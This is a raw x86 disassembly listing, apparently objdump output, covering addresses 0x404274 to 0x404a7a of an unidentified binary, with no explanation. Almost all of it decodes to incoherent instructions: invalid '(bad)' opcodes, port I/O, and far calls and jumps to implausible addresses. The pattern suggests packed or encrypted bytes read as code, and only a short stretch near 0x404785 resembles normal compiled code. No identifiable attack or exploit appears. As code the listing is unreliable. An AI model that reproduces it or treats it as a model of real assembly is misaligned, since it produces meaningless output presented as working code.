  404274:	mov    eax,ds:0xd4e515b2
  404279:	pop    edi
  40427a:	sbb    eax,0x174908a8
  40427f:	push   cs
  404280:	sbb    DWORD PTR [esi-0x6eb63bf3],ebx
  404286:	xchg   DWORD PTR [edx],edi
  404288:	retf   0xdcda
  40428b:	mov    edi,0xac8ca89
  404290:	adc    eax,0x6fa0d650
  404295:	popa   
  404296:	fbld   TBYTE PTR [edi-0x5f53c6b7]
  40429c:	add    edx,DWORD PTR [esi+eax*2-0x25]
  4042a0:	fdiv   st,st(0)
  4042a2:	xchg   ebx,eax
  4042a3:	xor    cl,dh
  4042a5:	repnz stos DWORD PTR es:[edi],eax
  4042a7:	stos   DWORD PTR es:[edi],eax
  4042a8:	push   ecx
  4042a9:	mov    al,0x10
  4042ab:	jmp    0x3f537e95
  4042b0:	mov    edx,0x918728ef
  4042b5:	fs or  bl,0x31
  4042b9:	nop
  4042ba:	or     ebx,DWORD PTR ds:0xb0b8c1e9
  4042c0:	lahf   
  4042c1:	arpl   WORD PTR [edx+0x2f622c9c],cx
  4042c7:	push   es
  4042c8:	lea    esp,ds:0x362280c8
  4042ce:	mov    edi,0x8e70416
  4042d3:	push   esi
  4042d4:	jae    0x4042e5
  4042d6:	out    dx,al
  4042d7:	sub    DWORD PTR [ebp+0x4e],ebx
  4042da:	and    eax,0xdf8d3120
  4042df:	mov    BYTE PTR [esi-0x80],0xe7
  4042e3:	or     ah,BYTE PTR [ebp-0x62]
  4042e6:	sub    eax,0xe16505bf
  4042eb:	add    DWORD PTR [edi+0x12493cee],ebp
  4042f1:	dec    ebp
  4042f2:	sbb    BYTE PTR [ebx-0x11],al
  4042f5:	jp     0x40432e
  4042f7:	jle    0x40433f
  4042f9:	stos   DWORD PTR es:[edi],eax
  4042fa:	mov    gs,WORD PTR [ebx+0xd]
  4042fd:	outs   dx,DWORD PTR ds:[esi]
  4042fe:	push   0x31
  404300:	cli    
  404301:	add    eax,0x230ac600
  404306:	jo     0x4042a1
  404308:	pusha  
  404309:	mov    dl,0x6f
  40430b:	add    eax,0x47cdba70
  404310:	mov    bh,bh
  404312:	cmp    edx,edx
  404314:	lds    eax,FWORD PTR [edx-0xe]
  404317:	fnstsw WORD PTR [edi+0x5511a67a]
  40431d:	shl    BYTE PTR [esi+0x60],1
  404320:	sbb    al,0x32
  404322:	ja     0x404398
  404324:	in     eax,0x50
  404326:	xor    ebp,ecx
  404328:	retf   
  404329:	cdq    
  40432a:	mov    ebx,0x9a7a0f29
  40432f:	in     eax,0x59
  404331:	fwait
  404332:	icebp  
  404333:	mov    ecx,0x33a5ef3c
  404338:	scas   al,BYTE PTR es:[edi]
  404339:	test   ecx,0x700851f3
  40433f:	hlt    
  404340:	aaa    
  404341:	push   eax
  404342:	call   0x4220:0xe33fad3f
  404349:	or     ebx,0xfffffff9
  40434c:	inc    eax
  40434d:	sbb    dl,BYTE PTR [edi]
  40434f:	xchg   esp,eax
  404350:	in     eax,0x83
  404352:	ins    DWORD PTR es:[edi],dx
  404353:	(bad)  
  404354:	mov    DWORD PTR [eax+eax*1],edx
  404357:	xor    eax,0xef74cd2e
  40435c:	xchg   edx,eax
  40435d:	stos   DWORD PTR es:[edi],eax
  40435e:	mov    eax,ds:0xab590530
  404363:	and    ah,bh
  404365:	dec    esi
  404366:	sub    bl,BYTE PTR [esi-0xa]
  404369:	inc    esi
  40436a:	sbb    al,0x87
  40436c:	sbb    BYTE PTR [eax+ebp*2],bh
  40436f:	aas    
  404370:	push   eax
  404371:	jbe    0x404348
  404373:	lea    esi,[esp+eiz*2+0x77ca6722]
  40437a:	adc    bl,al
  40437c:	sar    DWORD PTR [ecx],1
  40437e:	xor    eax,0x246b9c0c
  404383:	jnp    0x40430b
  404385:	and    esp,edi
  404387:	mov    eax,ds:0x6af2bfed
  40438c:	clc    
  40438d:	bound  esi,QWORD PTR [edi+0x57637dac]
  404393:	sar    ch,1
  404395:	mov    eax,ds:0x1aab484e
  40439a:	aad    0x33
  40439c:	popa   
  40439d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40439e:	xor    al,0x30
  4043a0:	jl     0x4043e4
  4043a2:	call   0xd24bdc21
  4043a7:	push   esi
  4043a8:	imul   eax,DWORD PTR [bp+si-0x3363],0xbe8e8420
  4043b1:	sti    
  4043b2:	clc    
  4043b3:	shl    al,0x52
  4043b6:	jg     0x404399
  4043b8:	sub    BYTE PTR [edi-0x3591c5e5],ah
  4043be:	or     al,0x49
  4043c0:	sub    DWORD PTR [ecx+0x29],edi
  4043c3:	sub    al,bh
  4043c5:	pop    ss
  4043c6:	sub    al,0xf9
  4043c8:	xor    eax,0x88a4039e
  4043cd:	pop    esi
  4043ce:	jbe    0x40438b
  4043d0:	mov    al,0xd9
  4043d2:	xor    ebp,DWORD PTR ds:[eax+0x48469665]
  4043d9:	popa   
  4043da:	in     eax,dx
  4043db:	pop    esi
  4043dc:	ds jbe 0x4043db
  4043df:	icebp  
  4043e0:	xchg   cx,ax
  4043e2:	pop    ds
  4043e3:	out    0x53,al
  4043e5:	xchg   esi,eax
  4043e6:	add    DWORD PTR [esi-0x4f],esp
  4043e9:	push   0xffffffe2
  4043eb:	mov    ebx,0xb1101527
  4043f0:	ds or  ecx,eax
  4043f3:	fs dec ecx
  4043f5:	adc    al,0xc3
  4043f7:	icebp  
  4043f8:	dec    ebx
  4043f9:	cmp    edx,DWORD PTR [edi-0x25dfec53]
  4043ff:	ds test eax,0xb67f936d
  404405:	stos   BYTE PTR es:[edi],al
  404406:	(bad)  
  404407:	push   edx
  404408:	adc    BYTE PTR [eax-0x2fda13c],al
  40440e:	ret    0x39f3
  404411:	lea    eax,[ebp-0x432c50b4]
  404417:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404418:	repz and al,0x0
  40441b:	dec    edx
  40441c:	mov    al,ds:0x30a246b7
  404421:	push   esi
  404422:	dec    esi
  404423:	fisttp DWORD PTR [ebx-0x107fb47]
  404429:	rol    DWORD PTR [eax+eax*8-0x1a],1
  40442d:	jmp    0x53b78424
  404432:	mov    cs,WORD PTR [esi]
  404434:	rcl    DWORD PTR [eax+ebx*8+0x5983d85],cl
  40443b:	xchg   ecx,eax
  40443c:	sbb    dl,BYTE PTR [esi-0x11f0b504]
  404442:	jp     0x4043c9
  404444:	arpl   WORD PTR [ebx+0x6f],di
  404447:	add    eax,0xd9ff467c
  40444c:	adc    dh,dl
  40444e:	out    0xe5,eax
  404450:	fcmove st,st(4)
  404452:	and    al,BYTE PTR es:[edi-0x6d40b59e]
  404459:	aas    
  40445a:	call   0x6e648866
  40445f:	xor    BYTE PTR [eax-0x5fcab8de],ch
  404465:	fisub  WORD PTR [ebx+0x47]
  404468:	in     al,dx
  404469:	leave  
  40446a:	push   0xffffffdf
  40446c:	mov    ah,0x40
  40446e:	retf   0x71ec
  404471:	and    dh,al
  404473:	(bad)  [edi]
  404475:	pop    ecx
  404476:	sti    
  404477:	nop
  404478:	hlt    
  404479:	jo     0x404443
  40447b:	in     al,0x33
  40447d:	clc    
  40447e:	jmp    0x404781
  404483:	add    bl,BYTE PTR [ebp+0x44]
  404486:	dec    ecx
  404487:	popa   
  404488:	jno    0x40449d
  40448a:	jne    0x4044e2
  40448c:	xor    al,0xa0
  40448e:	jle    0x40445b
  404490:	xchg   ebx,eax
  404491:	jno    0x404431
  404493:	pop    esi
  404494:	sbb    BYTE PTR [esi+0x7e],bh
  404497:	pop    eax
  404498:	jl     0x404518
  40449a:	jle    0x404494
  40449c:	and    eax,0x3bb893c1
  4044a1:	lahf   
  4044a2:	cld    
  4044a3:	out    dx,eax
  4044a4:	dec    edx
  4044a5:	adc    eax,0x512384da
  4044aa:	jle    0x4044c3
  4044ac:	out    0x66,al
  4044ae:	ja     0x404463
  4044b0:	push   esp
  4044b1:	and    BYTE PTR [ecx+esi*8-0x6f],ah
  4044b5:	fwait
  4044b6:	out    dx,al
  4044b7:	cmp    eax,0x39838963
  4044bc:	dec    eax
  4044bd:	das    
  4044be:	or     eax,0x51f63e41
  4044c3:	int    0xac
  4044c5:	add    ebp,DWORD PTR [esi]
  4044c7:	xor    eax,0xca8421d9
  4044cc:	mov    ecx,0xd344cd98
  4044d1:	aad    0x1c
  4044d3:	js     0x404547
  4044d5:	fs jne 0x404472
  4044d8:	inc    esp
  4044d9:	inc    edx
  4044da:	push   eax
  4044db:	bound  ebx,QWORD PTR ds:0x9fd4131c
  4044e1:	call   0x28c53cc1
  4044e6:	fcompp 
  4044e8:	add    al,0x1b
  4044ea:	std    
  4044eb:	cmp    bl,BYTE PTR [edi]
  4044ed:	out    dx,al
  4044ee:	mov    dl,0x3
  4044f0:	test   bl,bh
  4044f2:	push   dx
  4044f4:	dec    edx
  4044f5:	xchg   edi,eax
  4044f6:	ins    DWORD PTR es:[edi],dx
  4044f7:	arpl   dx,sp
  4044f9:	mov    edx,0x73c290ad
  4044fe:	push   esi
  4044ff:	push   esp
  404500:	xchg   edi,eax
  404501:	cs dec edi
  404503:	fs enter 0x2a6b,0x46
  404508:	out    0xe5,eax
  40450a:	push   0x4b
  40450c:	inc    ebp
  40450d:	call   0x43da:0x408bb01a
  404514:	dec    ecx
  404515:	xchg   ebp,eax
  404516:	jne    0x4044ef
  404518:	ss jo  0x404508
  40451b:	js     0x4044c3
  40451d:	xchg   BYTE PTR [edi+0x334b3462],ah
  404523:	xchg   esi,eax
  404524:	mov    esi,0x16c0023a
  404529:	mov    eax,0xa151107b
  40452e:	stos   BYTE PTR es:[edi],al
  40452f:	arpl   WORD PTR [ebp+0x2f],bx
  404532:	mov    bh,0x2d
  404534:	cdq    
  404535:	leave  
  404536:	jno    0x4044da
  404538:	xacquire xchg BYTE PTR [ebp+0x7e],al
  40453c:	mov    ds:0x99d1b881,al
  404541:	enter  0xb36,0x94
  404545:	rcr    BYTE PTR [esi],0xd1
  404548:	mov    dl,0x3f
  40454a:	jno    0x4045be
  40454c:	sub    BYTE PTR [eax-0x1d9a3496],ah
  404552:	inc    edx
  404553:	jmp    0x4044f6
  404555:	cld    
  404556:	pop    edx
  404557:	mov    bh,0xa7
  404559:	cmp    eax,0xe352b794
  40455e:	ja     0x404560
  404560:	fisubr DWORD PTR ds:0x2291290b
  404566:	jne    0x4045d5
  404568:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404569:	push   ecx
  40456a:	cdq    
  40456b:	sub    eax,0xd40a624f
  404570:	jmp    0x33db:0xee2d2c5
  404577:	outs   dx,BYTE PTR ds:[esi]
  404578:	and    al,0xc3
  40457a:	loop   0x4045b7
  40457c:	cmc    
  40457d:	jle    0x4045f8
  40457f:	sbb    ebx,DWORD PTR [ebx+0x7c065a91]
  404585:	xchg   ebx,eax
  404586:	cdq    
  404587:	add    DWORD PTR [ebp-0x2d],eax
  40458a:	in     al,dx
  40458b:	mov    esi,DWORD PTR [ecx+edi*8-0x80]
  40458f:	dec    esi
  404590:	mov    ecx,0xb1a9b4b
  404595:	push   ebx
  404596:	iret   
  404597:	iret   
  404598:	in     al,0x4f
  40459a:	dec    esp
  40459b:	jl     0x404603
  40459d:	sub    BYTE PTR [ebx-0x7f],dl
  4045a0:	popf   
  4045a1:	test   DWORD PTR [edi],0x25512f8c
  4045a7:	and    al,BYTE PTR [ebx-0x3b]
  4045aa:	arpl   WORD PTR [ebp+0x29539e8d],bp
  4045b0:	ret    0xd728
  4045b3:	pushf  
  4045b4:	jb     0x404613
  4045b6:	aas    
  4045b7:	stos   DWORD PTR es:[edi],eax
  4045b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4045b9:	jle    0x404582
  4045bb:	pop    ss
  4045bc:	pop    DWORD PTR [esi+ebx*2]
  4045bf:	in     eax,0x30
  4045c1:	cdq    
  4045c2:	or     al,0x9
  4045c4:	les    esp,FWORD PTR [ebx-0xf]
  4045c7:	cdq    
  4045c8:	inc    ebp
  4045c9:	hlt    
  4045ca:	sub    BYTE PTR [edi+0x73],0xf0
  4045ce:	ret    0x4e1a
  4045d1:	test   al,ah
  4045d3:	repnz adc bh,ah
  4045d6:	fnsave [ebp-0x2d1ef1d0]
  4045dc:	out    dx,al
  4045dd:	ror    BYTE PTR [ebp-0x71a70d6b],0x51
  4045e4:	push   ebp
  4045e5:	sub    esp,DWORD PTR [ebx]
  4045e7:	popa   
  4045e8:	inc    ebx
  4045e9:	(bad)  
  4045ea:	daa    
  4045eb:	sbb    BYTE PTR [edx+0x66],ch
  4045ee:	mov    al,ds:0xce0a8d82
  4045f3:	fs and al,0x99
  4045f6:	sub    al,0xb8
  4045f8:	add    al,0xa7
  4045fa:	mov    esp,0x2a63fd07
  4045ff:	dec    ebp
  404600:	or     DWORD PTR [esi+0x6f],edi
  404603:	clc    
  404604:	stos   DWORD PTR es:[edi],eax
  404605:	sub    DWORD PTR [esi],ecx
  404607:	dec    ebx
  404608:	cmp    cl,BYTE PTR [edi+0x50]
  40460b:	ret    
  40460c:	add    eax,0x7fff8f6c
  404611:	inc    ebx
  404612:	inc    edi
  404613:	xor    BYTE PTR ds:0xdb1a4a8a,dl
  404619:	pop    ds
  40461a:	push   ebx
  40461b:	add    BYTE PTR [ebx],ah
  40461d:	jnp    0x404659
  40461f:	out    0xd5,eax
  404621:	ja     0x404628
  404623:	scas   al,BYTE PTR es:[edi]
  404624:	inc    esp
  404625:	cmc    
  404626:	inc    edi
  404627:	stc    
  404628:	pop    es
  404629:	ret    0x3a8e
  40462c:	xchg   edi,eax
  40462d:	loopne 0x4045e9
  40462f:	push   0xcebd8b7f
  404634:	mov    edx,0x71132a31
  404639:	out    0x1d,eax
  40463b:	adc    ecx,DWORD PTR [eax]
  40463d:	clc    
  40463e:	shr    BYTE PTR [ebp-0xf],cl
  404641:	xor    bl,BYTE PTR [edx+0x70d71d2]
  404647:	inc    eax
  404648:	mov    cl,0x9c
  40464a:	mov    eax,0xcdd59b17
  40464f:	out    dx,eax
  404650:	mov    fs,WORD PTR [ecx-0x442e5970]
  404656:	sub    ebx,ebx
  404658:	xor    ecx,DWORD PTR [edi]
  40465a:	aam    0xe5
  40465c:	add    dh,dh
  40465e:	lds    ebx,FWORD PTR [edx+0x6f]
  404661:	sub    dl,BYTE PTR [ebp+0x47]
  404664:	inc    esp
  404665:	fidivr WORD PTR [esi]
  404667:	dec    esi
  404668:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404669:	dec    ebp
  40466a:	leave  
  40466b:	ficomp WORD PTR [ebp-0x80]
  40466e:	add    BYTE PTR [ebx-0x35331ea5],cl
  404674:	cmp    al,0x76
  404676:	jp     0x4046b6
  404678:	jp     0x4046db
  40467a:	pop    esp
  40467b:	push   edx
  40467c:	push   edx
  40467d:	retf   0xb96f
  404680:	dec    eax
  404681:	jmp    0x56:0x30f8a90d
  404688:	xor    BYTE PTR [ebp-0x2ad9e913],0x6
  40468f:	daa    
  404690:	stos   DWORD PTR es:[edi],eax
  404691:	xchg   DWORD PTR [esi-0x3cf77dfe],edx
  404697:	pop    edi
  404698:	xchg   esi,eax
  404699:	das    
  40469a:	cmp    cl,cl
  40469c:	fistp  DWORD PTR [edx-0x638e6e6]
  4046a2:	ja     0x4046d1
  4046a4:	pop    ebp
  4046a5:	add    eax,DWORD PTR [edx+edi*8-0x5e]
  4046a9:	xlat   BYTE PTR ds:[ebx]
  4046aa:	stos   DWORD PTR es:[edi],eax
  4046ab:	sub    eax,0x35931ecb
  4046b0:	clc    
  4046b1:	arpl   cx,ax
  4046b3:	push   ebp
  4046b4:	push   ecx
  4046b5:	add    eax,0xf44ee560
  4046ba:	jle    0x404715
  4046bc:	iret   
  4046bd:	call   0xda020609
  4046c2:	test   DWORD PTR [ecx+0x47],esi
  4046c5:	sti    
  4046c6:	pop    ecx
  4046c7:	mov    eax,DWORD PTR ds:[edx+0x3fe9fdd9]
  4046ce:	in     eax,dx
  4046cf:	loopne 0x4046da
  4046d1:	push   edx
  4046d2:	inc    edx
  4046d3:	xchg   esp,eax
  4046d4:	and    dl,BYTE PTR cs:[esi]
  4046d7:	mov    ds:0xb2f8dfe,eax
  4046dc:	mov    cl,0xfa
  4046de:	popa   
  4046df:	adc    al,0x2
  4046e1:	(bad)  
  4046e2:	fadd   DWORD PTR [esi]
  4046e4:	sbb    DWORD PTR [edi+0x39],ecx
  4046e7:	jmp    0x40470e
  4046e9:	retf   
  4046ea:	sti    
  4046eb:	nop
  4046ec:	rcr    BYTE PTR [edi+0x5],cl
  4046ef:	pop    esi
  4046f0:	xor    BYTE PTR [eax+0x71e93654],bh
  4046f6:	or     ecx,esp
  4046f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4046f9:	xchg   esp,esi
  4046fb:	int    0x55
  4046fd:	(bad)  
  4046ff:	or     esi,0x19
  404702:	in     al,0xd1
  404704:	pop    esi
  404705:	mov    edi,0xe9246696
  40470a:	push   es
  40470b:	sbb    ch,dl
  40470d:	int3   
  40470e:	ins    BYTE PTR es:[edi],dx
  40470f:	mov    edi,0x68d95bc0
  404714:	pop    eax
  404715:	cmp    DWORD PTR [edx-0x29ce23f9],eax
  40471b:	cdq    
  40471c:	add    DWORD PTR [bx+si],ecx
  40471f:	mov    bh,0xac
  404721:	(bad)  
  404722:	rol    DWORD PTR [ebp+0x35],1
  404725:	add    al,0x1
  404727:	imul   edi,edx,0xffffff9d
  40472a:	call   0xfb7a:0x7a284aa4
  404731:	and    al,0x39
  404733:	mov    esi,0x549a99bc
  404738:	sub    ebx,esp
  40473a:	adc    cl,ah
  40473c:	lock lock imul ecx,DWORD PTR [edx-0x4e],0x12b96ade
  404745:	fld    DWORD PTR [edx-0x3a133641]
  40474b:	sub    DWORD PTR [edx+ecx*4-0x76c95a53],ecx
  404752:	dec    ecx
  404753:	pop    ebx
  404754:	or     al,0xcf
  404757:	push   ss
  404758:	out    dx,al
  404759:	cmp    ecx,edx
  40475b:	jne    0x40478d
  40475d:	xor    eax,0x4fcaed8
  404762:	sub    DWORD PTR [esi-0x65],edi
  404765:	push   0x3a
  404767:	sbb    ch,BYTE PTR [edi]
  404769:	lods   al,BYTE PTR ds:[esi]
  40476a:	adc    al,0x2e
  40476c:	mov    WORD PTR ds:0x28ef104d,cs
  404772:	hlt    
  404773:	nop
  404774:	outs   dx,DWORD PTR ds:[esi]
  404775:	and    ah,dh
  404777:	pop    eax
  404778:	pop    ebx
  404779:	xchg   ecx,eax
  40477a:	leave  
  40477b:	clc    
  40477c:	stc    
  40477d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40477e:	jmp    0x404766
  404780:	mov    ds:0xf903d033,al
  404785:	add    edx,ecx
  404787:	imul   edx,edi
  40478a:	mov    DWORD PTR [ebp+0xc],edx
  40478d:	mov    edx,DWORD PTR [ebp+0xc]
  404790:	mov    DWORD PTR [ebp-0x24],edx
  404793:	mov    edx,DWORD PTR [ebp-0x8]
  404796:	add    edx,DWORD PTR [ebp-0x40]
  404799:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  4047a0:	mov    DWORD PTR [ebp-0x1c],edx
  4047a3:	jmp    0x404aa6
  4047a8:	sub    ch,BYTE PTR [eax+edi*1+0x6b69b8ad]
  4047af:	test   eax,0xf2c2fa45
  4047b4:	adc    BYTE PTR [edi+0x62],0xff
  4047b8:	mov    eax,0x587e7e27
  4047bd:	jl     0x40483d
  4047bf:	jle    0x40479e
  4047c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4047c2:	cli    
  4047c3:	inc    ecx
  4047c4:	(bad)  
  4047c5:	fnsave [ecx-0x15]
  4047c8:	xlat   BYTE PTR ds:[ebx]
  4047c9:	pop    esi
  4047ca:	scas   al,BYTE PTR es:[edi]
  4047cb:	inc    eax
  4047cc:	stc    
  4047cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4047ce:	jno    0x404768
  4047d0:	fldenv [edx+ecx*1-0x68]
  4047d4:	retf   0x5dbf
  4047d7:	ja     0x4047cf
  4047d9:	cwde   
  4047da:	(bad)  
  4047db:	mov    eax,DWORD PTR [ebx]
  4047dd:	shl    BYTE PTR [ebp+0x44],cl
  4047e0:	push   0x66d0b09b
  4047e5:	xchg   ebx,eax
  4047e6:	sbb    edi,DWORD PTR [ecx-0x41c4f1]
  4047ec:	xchg   BYTE PTR [edx+0x23],bh
  4047ef:	stos   DWORD PTR es:[edi],eax
  4047f0:	lahf   
  4047f1:	pop    edi
  4047f2:	clc    
  4047f3:	mov    eax,0x72606e3b
  4047f8:	push   cs
  4047f9:	fimul  WORD PTR [ebx]
  4047fb:	outs   dx,DWORD PTR ds:[esi]
  4047fc:	mov    bh,0x79
  4047fe:	loopne 0x4047de
  404800:	mov    ds:0x6b56d3ac,al
  404805:	push   esp
  404806:	js     0x404851
  404808:	xchg   ah,dl
  40480a:	xor    DWORD PTR [ebx+esi*4+0x10],ebp
  40480e:	xor    BYTE PTR [edi+0x6ae3e499],ch
  404814:	shl    cl,1
  404816:	imul   BYTE PTR [ebx-0x4b90225c]
  40481c:	std    
  40481d:	xor    eax,0x491df3b1
  404822:	mov    eax,0xb8b287e8
  404827:	int    0x56
  404829:	adc    BYTE PTR [ebp-0x4501d382],0x3a
  404830:	popf   
  404831:	or     BYTE PTR [ebx-0x40],ch
  404834:	or     al,0x80
  404836:	sub    BYTE PTR [edi+0x9],cl
  404839:	jecxz  0x404878
  40483b:	mov    dh,0xc2
  40483d:	loope  0x4047c9
  40483f:	enter  0xa137,0x15
  404843:	hlt    
  404844:	aad    0x4e
  404846:	ret    
  404847:	jl     0x404865
  404849:	inc    ebp
  40484a:	call   0x1409e5e9
  40484f:	dec    esi
  404850:	aaa    
  404851:	(bad)  
  404852:	or     edx,eax
  404854:	mov    ecx,0x24c3c6aa
  404859:	test   BYTE PTR [esi-0x29],ah
  40485c:	call   0xfa9635ec
  404861:	pop    ds
  404862:	inc    eax
  404863:	retf   
  404864:	loopne 0x4048d4
  404866:	in     al,0x5b
  404868:	imul   al
  40486a:	mov    edx,0xd8b046ef
  40486f:	fsub   DWORD PTR [esi]
  404871:	fsub   DWORD PTR [edx+0x35]
  404874:	ror    BYTE PTR [ecx+eiz*2+0x516cb8c7],cl
  40487b:	popa   
  40487c:	clc    
  40487d:	push   es
  40487e:	add    dl,BYTE PTR [ebp+0x5cd55831]
  404884:	xchg   edx,eax
  404885:	mov    bh,0x23
  404887:	call   0xe23f:0xbc514199
  40488e:	into   
  40488f:	or     BYTE PTR [ebx],dh
  404891:	cmc    
  404892:	mov    esi,0x1465b6d3
  404897:	sti    
  404898:	mov    DWORD PTR [eax],ebp
  40489a:	push   0x9cef42af
  40489f:	or     eax,esp
  4048a1:	xor    BYTE PTR [eax],0xf0
  4048a4:	retf   
  4048a5:	ins    BYTE PTR es:[edi],dx
  4048a6:	mov    esp,0x7adf7a5f
  4048ab:	lods   eax,DWORD PTR ds:[esi]
  4048ac:	jmp    0x45cbf009
  4048b1:	mov    cl,BYTE PTR [eax-0x286cf832]
  4048b7:	push   ss
  4048b8:	xchg   DWORD PTR [ebp+ebx*4+0x58],ebx
  4048bc:	xor    BYTE PTR [esi],dl
  4048be:	mov    esp,0x662bda95
  4048c3:	push   ebp
  4048c4:	sbb    eax,0x2e53a312
  4048c9:	stos   BYTE PTR es:[edi],al
  4048ca:	xchg   edi,eax
  4048cb:	ret    
  4048cc:	jp     0x4048fa
  4048ce:	push   eax
  4048cf:	xor    DWORD PTR [ebx],eax
  4048d1:	fdivrp st(7),st
  4048d3:	jmp    0x4048e3
  4048d5:	rol    eax,0xbf
  4048d8:	imul   edi,DWORD PTR [edi+ecx*8],0xfffffff9
  4048dc:	call   0xe84f4202
  4048e1:	out    dx,eax
  4048e2:	fsub   QWORD PTR [eax+0x5b]
  4048e5:	shl    BYTE PTR [ebx],cl
  4048e7:	neg    BYTE PTR [eax+0x3f4bba4d]
  4048ed:	ins    BYTE PTR es:[edi],dx
  4048ee:	sbb    edx,DWORD PTR [edx]
  4048f0:	adc    DWORD PTR [ebx+eiz*1-0x35],esp
  4048f4:	call   0xca03:0xc67a318b
  4048fb:	ds add al,0xf8
  4048fe:	or     eax,0x7f2423e3
  404903:	mov    ebx,0x20cfda98
  404908:	adc    BYTE PTR ds:0x1aab8144,bl
  40490e:	js     0x40492a
  404910:	ds dec ebp
  404912:	fadd   st,st(3)
  404914:	mov    BYTE PTR [edi],dh
  404916:	rol    DWORD PTR [edi],1
  404918:	dec    edx
  404919:	clc    
  40491a:	xlat   BYTE PTR ds:[ebx]
  40491b:	test   ch,0x5a
  40491e:	cmp    al,0x34
  404920:	adc    DWORD PTR [eax-0x36],esi
  404923:	xchg   edi,eax
  404924:	call   0xed1d2017
  404929:	aaa    
  40492a:	or     ebp,ebx
  40492c:	push   0x4
  40492e:	test   al,0x2b
  404930:	jo     0x40493a
  404932:	xchg   BYTE PTR [eax-0x5b],ah
  404935:	dec    ecx
  404936:	xchg   edi,eax
  404937:	aad    0xdf
  404939:	dec    ecx
  40493b:	pop    ds
  40493c:	in     eax,dx
  40493d:	add    ebx,DWORD PTR [ebp-0x1b]
  404940:	mov    ds,ebx
  404942:	xor    esi,DWORD PTR [edx+ecx*4+0x7a]
  404946:	jmp    0x4977b55d
  40494b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40494c:	loope  0x4048eb
  40494e:	add    al,0xe0
  404950:	pop    ds
  404951:	cmp    al,0xc6
  404953:	jecxz  0x404945
  404955:	adc    BYTE PTR [ebx+ecx*1-0x72ab2a17],bl
  40495c:	add    edi,DWORD PTR [edx+0x67]
  40495f:	xchg   DWORD PTR [eax-0x63c4d894],ebp
  404965:	loopne 0x404964
  404967:	fnsave [esi+edx*4+0x22]
  40496b:	ja     0x404911
  40496d:	mov    ebp,0xe68d74a6
  404972:	nop
  404973:	(bad)  
  404974:	push   edx
  404975:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404976:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404977:	mov    esi,0xc00f8cee
  40497c:	(bad)
  404980:	fs and ch,ah
  404983:	call   0x694da6cd
  404988:	mov    dh,BYTE PTR [ecx]
  40498a:	adc    BYTE PTR [ebp-0x510c9fcb],0xc7
  404991:	mov    ds:0x1652d9a1,eax
  404996:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404997:	arpl   sp,sp
  404999:	enter  0xbfe3,0x3c
  40499d:	jns    0x40497e
  40499f:	xchg   ecx,eax
  4049a0:	inc    ecx
  4049a1:	test   eax,0x5c257f8a
  4049a6:	xor    BYTE PTR [edi-0x47f3e692],ah
  4049ac:	data16 popw es
  4049af:	inc    edx
  4049b0:	out    dx,eax
  4049b1:	cwde   
  4049b2:	fisubr WORD PTR [ebp-0x61341524]
  4049b8:	mov    dl,0xee
  4049ba:	fsubr  DWORD PTR [esp+ecx*4-0x1a49122a]
  4049c1:	aaa    
  4049c2:	mov    bl,0x1f
  4049c4:	pop    eax
  4049c5:	stc    
  4049c6:	stos   DWORD PTR es:[edi],eax
  4049c7:	pop    ds
  4049c8:	xchg   ebp,eax
  4049c9:	jecxz  0x4049fa
  4049cb:	inc    edi
  4049cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4049cd:	dec    esp
  4049ce:	mov    ah,0x7c
  4049d0:	adc    ebp,ecx
  4049d2:	lds    esi,FWORD PTR [ebx+0x23096bd6]
  4049d8:	sti    
  4049d9:	(bad)  
  4049da:	dec    eax
  4049db:	xor    ecx,0xbcad504
  4049e1:	icebp  
  4049e2:	arpl   WORD PTR [esi+0x46],bp
  4049e5:	cs sub eax,0x8026f4b3
  4049eb:	(bad)  
  4049ec:	push   ss
  4049ed:	scas   al,BYTE PTR es:[edi]
  4049ee:	add    esp,0xd5021420
  4049f4:	pop    eax
  4049f5:	jno    0x404a01
  4049f7:	mov    fs,WORD PTR [eax+0x5]
  4049fa:	push   cs
  4049fb:	or     BYTE PTR [ebx],bl
  4049fd:	leave  
  4049fe:	das    
  4049ff:	jo     0x404a2d
  404a01:	mov    dl,0x55
  404a03:	cs inc ecx
  404a05:	fisttp DWORD PTR [ecx+0x29]
  404a08:	push   edx
  404a09:	fidiv  WORD PTR [edx+0x1f4d63b4]
  404a0f:	sbb    eax,0xb2e934ab
  404a14:	test   DWORD PTR [ecx-0x25b95df6],esi
  404a1a:	sub    al,0x15
  404a1c:	arpl   WORD PTR [ebx-0x7a68e4a9],dx
  404a22:	sbb    al,0x9b
  404a24:	and    ecx,DWORD PTR [edx-0x59710afd]
  404a2a:	lea    edx,[esp+esi*2+0x13]
  404a2e:	mov    ecx,0x556bb6b4
  404a33:	cmp    BYTE PTR [ebx-0x1b93a849],bl
  404a39:	and    eax,0x2e902fbc
  404a3e:	xacquire xchg BYTE PTR [edi-0x7a],bl
  404a42:	dec    eax
  404a43:	std    
  404a44:	jno    0x404a96
  404a46:	xchg   edx,eax
  404a47:	xor    edx,DWORD PTR [edi+0x3bab7c8c]
  404a4d:	dec    ecx
  404a4e:	shl    BYTE PTR [ebx+0x15e143ad],1
  404a54:	mov    ch,0x86
  404a56:	retf   
  404a57:	push   eax
  404a58:	ins    DWORD PTR es:[edi],dx
  404a59:	mov    BYTE PTR [esi+0x7c],dh
  404a5c:	mov    ch,0xda
  404a5e:	push   ss
  404a5f:	mov    eax,0xedf1a8db
  404a64:	and    bh,bh
  404a66:	adc    dh,al
  404a68:	xchg   ecx,eax
  404a69:	xchg   edx,eax
  404a6a:	sub    BYTE PTR [edx-0x31],bh
  404a6d:	mov    ch,0xea
  404a6f:	jo     0x404a86
  404a71:	mov    esp,0xa2ce063b
  404a76:	stc    
  404a77:	pop    edi
  404a78:	sti    
  404a79:	popf   
  404a7a:	cmc    
